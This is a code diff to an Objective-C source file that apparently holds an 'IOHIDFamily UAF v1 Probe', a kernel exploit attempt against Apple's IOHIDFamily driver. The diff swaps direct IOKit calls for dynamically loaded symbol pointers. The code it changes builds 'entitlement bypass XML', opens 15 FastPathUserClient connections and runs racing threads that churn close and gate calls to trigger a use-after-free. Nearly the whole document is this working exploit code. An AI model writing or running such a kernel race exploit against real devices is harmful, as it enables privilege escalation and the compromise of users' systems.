@@ -7008,12 +7008,12 @@ static NSData *iohid_buildGateXML(void) {
 
 static kern_return_t iohid_gateConn(io_connect_t conn) {
     uint64_t scalar = 0;
-    return IOConnectCallMethod(conn,
-                               0,  // sel0 = open/gate
-                               &scalar, 1,
-                               iohid_g_gateXML.bytes, iohid_g_gateXML.length,
-                               NULL, NULL,
-                               NULL, NULL);
+    return sIOConnectCallMethod(conn,
+                                0,  // sel0 = open/gate
+                                &scalar, 1,
+                                iohid_g_gateXML.bytes, iohid_g_gateXML.length,
+                                NULL, NULL,
+                                NULL, NULL);
 }
 
 // Thread A: rapid close→gate churn on conn[0]
@@ -7023,9 +7023,9 @@ static void *iohid_threadChurn(void *arg) {
     (void)arg;
     uint64_t scalar = 0;
     while (!atomic_load(&iohid_g_stop)) {
-        IOConnectCallMethod(iohid_g_conns[0], 1,
-                            &scalar, 1, NULL, 0,
-                            NULL, NULL, NULL, NULL);
+        sIOConnectCallMethod(iohid_g_conns[0], 1,
+                             &scalar, 1, NULL, 0,
+                             NULL, NULL, NULL, NULL);
         iohid_gateConn(iohid_g_conns[0]);
     }
     return NULL;
@@ -7041,9 +7041,9 @@ static void *iohid_threadCopyEvent(void *arg) {
     int idx = a->idx;
     uint64_t args[2] = { 0, 1 };
     while (!atomic_load(&iohid_g_stop)) {
-        IOConnectCallMethod(iohid_g_conns[idx], 2,
-                            args, 2, NULL, 0,
-                            NULL, NULL, NULL, NULL);
+        sIOConnectCallMethod(iohid_g_conns[idx], 2,
+                             args, 2, NULL, 0,
+                             NULL, NULL, NULL, NULL);
     }
     return NULL;
 }
@@ -7096,6 +7096,13 @@ static void *iohid_threadCopyEvent(void *arg) {
 
     [log appendString:@"\n--- IOHIDFamily UAF v1 Probe ---\n"];
 
+    // Step 0: Ensure IOKit symbols are loaded
+    if (![self loadIOKitSymbols]) {
+        [log appendString:@"FAIL: Could not load IOKit symbols\n"];
+        dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
+        return;
+    }
+
     // Step 1: Build entitlement bypass XML
     iohid_g_gateXML = iohid_buildGateXML();
     if (!iohid_g_gateXML) {
@@ -7106,8 +7113,8 @@ static void *iohid_threadCopyEvent(void *arg) {
     [log appendFormat:@"[+] Gate XML: %lu bytes\n", (unsigned long)iohid_g_gateXML.length];
 
     // Step 2: Find IOHIDEventService
-    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
-        IOServiceMatching("IOHIDEventService"));
+    io_service_t service = sIOServiceGetMatchingService(MACH_PORT_NULL,
+        sIOServiceMatching("IOHIDEventService"));
     if (!service) {
         [log appendString:@"FAIL: IOHIDEventService not found\n"];
         dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
@@ -7118,7 +7125,7 @@ static void *iohid_threadCopyEvent(void *arg) {
     // Step 3: Open 15 connections (type 2 = FastPathUserClient)
     int openedConns = 0;
     for (int i = 0; i < IOHID_NUM_CONNS; i++) {
-        kern_return_t kr = IOServiceOpen(service, mach_task_self(), 2, &iohid_g_conns[i]);
+        kern_return_t kr = sIOServiceOpen(service, mach_task_self_, 2, &iohid_g_conns[i]);
         if (kr != KERN_SUCCESS) {
             [log appendFormat:@"[-] IOServiceOpen[%d] type=2 failed: 0x%x\n", i, kr];
             continue;
@@ -7173,7 +7180,7 @@ static void *iohid_threadCopyEvent(void *arg) {
 
     // Cleanup connections
     for (int i = 0; i < IOHID_NUM_CONNS; i++) {
-        if (iohid_g_conns[i]) IOServiceClose(iohid_g_conns[i]);
+        if (iohid_g_conns[i]) sIOServiceClose(iohid_g_conns[i]);
     }
 
     [[NSFileManager defaultManager] removeItemAtPath:marker error:nil];
